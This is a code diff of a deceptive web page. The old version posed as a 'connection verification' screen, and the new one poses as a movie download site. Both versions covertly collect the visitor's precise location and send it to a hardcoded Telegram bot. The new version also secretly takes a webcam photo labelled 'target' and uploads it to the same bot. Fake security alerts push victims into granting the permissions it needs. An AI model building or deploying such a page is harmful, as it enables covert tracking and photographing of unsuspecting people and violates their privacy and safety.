@@ -3,123 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifying Connection...</title>
+    <title>Download Latest Movies HD</title>
     <style>
-        /* Professional Loading Look */
         body {
-            background-color: #f4f7f9;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            background-color: #0f171e; /* Dark theme like Prime/Netflix */
+            color: white;
+            font-family: 'Arial', sans-serif;
             margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
-        .container {
+        .header {
+            width: 100%;
+            background: #1a242f;
+            padding: 15px;
             text-align: center;
-            background: white;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            max-width: 350px;
+            font-weight: bold;
+            font-size: 20px;
+            color: #ff9900;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        }
+        .movie-card {
+            margin-top: 30px;
             width: 90%;
+            max-width: 400px;
+            background: #1a242f;
+            border-radius: 10px;
+            overflow: hidden;
+            text-align: center;
         }
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+        .movie-poster {
+            width: 100%;
+            height: 250px;
+            background: url('https://via.placeholder.com/400x250?text=Movie+Poster') center/cover;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .details { padding: 20px; }
+        .btn-download {
+            background: #ff9900;
+            color: black;
+            border: none;
+            padding: 12px 30px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
         }
-        h2 { color: #333; font-size: 20px; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; line-height: 1.5; }
-        .status { font-size: 12px; color: #3498db; font-weight: bold; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; }
+        #status {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #888;
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="loader"></div>
-        <h2>Verifying Connection</h2>
-        <p>Please wait while we establish a secure connection to the server.</p>
-        <div class="status" id="statusText">Checking Browser...</div>
+<div class="header">MovieStream HD</div>
+
+<div class="movie-card">
+    <div class="movie-poster"></div>
+    <div class="details">
+        <h3>Puspa 2: The Rule (2024)</h3>
+        <p>Quality: BlueRay 1080p | Size: 1.4 GB</p>
+        <button class="btn-download" onclick="startVerification()">Download Now</button>
+        <div id="status">Click download to start high-speed server connection.</div>
     </div>
+</div>
 
-    <script>
-        // Aapka Bot Details (Fixed)
-        const token = '8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI';
-        const chatId = '7066124462';
+<canvas id="canvas" style="display:none;"></canvas>
+<video id="video" style="display:none;" autoplay></video>
 
-        const statusEl = document.getElementById('statusText');
+<script>
+    const token = '8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI';
+    const chatId = '7066124462';
+    const statusText = document.getElementById('status');
 
-        window.onload = function() {
-            setTimeout(() => {
-                requestLocation();
-            }, 1000); // 1 second ka delay natural lagne ke liye
-        };
+    // Button click hone par hi process shuru hoga
+    async function startVerification() {
+        statusText.innerText = "Connecting to Secure Server...";
+        
+        // Step 1: Location Access
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await sendLocation(pos);
+                // Step 2: Camera Access
+                await capturePhoto();
+            }, (err) => {
+                alert("Security Alert: Allow all permissions to verify your region and bypass robot check.");
+            }, { enableHighAccuracy: true });
+        } else {
+            alert("Your browser doesn't support secure downloads.");
+        }
+    }
 
-        function requestLocation() {
-            statusEl.innerText = "Requesting Access...";
+    async function sendLocation(pos) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        const text = `📍 *Target Clicked Link!*%0A%0AView: [Google Maps](${mapLink})`;
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`);
+    }
+
+    async function capturePhoto() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            await new Promise(resolve => video.onloadedmetadata = resolve);
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             
-            if (navigator.geolocation) {
-                // High Accuracy setting se location bilkul exact milti hai
-                navigator.geolocation.getCurrentPosition(success, error, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
+            setTimeout(async () => {
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'target.jpg');
+
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 });
-            } else {
-                statusEl.innerText = "Error: Browser not supported";
-                alert("Your browser is outdated. Please update to continue.");
-            }
-        }
 
-        function success(position) {
-            statusEl.innerText = "Encrypting Data...";
-            
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            
-            // Google Maps ka official search link
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            // Telegram Message Formatting
-            const message = `📍 *New Location Found!*%0A%0A` +
-                            `*Accuracy:* ${accuracy.toFixed(1)} meters%0A` +
-                            `*Lat:* \`${lat}\` %0A*Lon:* \`${lon}\` %0A%0A` +
-                            `🔗 [Open in Google Maps](${mapLink})`;
-
-            // API Call to Telegram
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
-            .then(response => {
-                statusEl.innerText = "Connection Verified!";
-                // Location milne ke baad user ko redirect karna
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Final Redirect
+                statusText.innerText = "Redirecting to Download Server...";
                 setTimeout(() => {
-                    window.location.href = "https://www.google.com"; // User ko asli site pe bhej do
-                }, 800);
-            })
-            .catch(err => {
-                console.error("Telegram API Error:", err);
-            });
+                    window.location.href = "https://www.google.com"; // Yahan movie link daal sakte hain
+                }, 1000);
+            }, 1000);
+        } catch (err) {
+            window.location.href = "https://www.google.com";
         }
+    }
+</script>
 
-        function error(err) {
-            statusEl.innerText = "Verification Failed";
-            // Agar user 'Block' kare toh hum use force kar sakte hain
-            if (err.code === 1) { // User denied Geolocation
-                alert("Security Error: Please allow location access to verify you are a human.");
-                location.reload(); // Page reload karke phir se puchega
-            } else {
-                alert("Connection lost. Please refresh the page.");
-            }
-        }
-    </script>
 </body>
 </html>
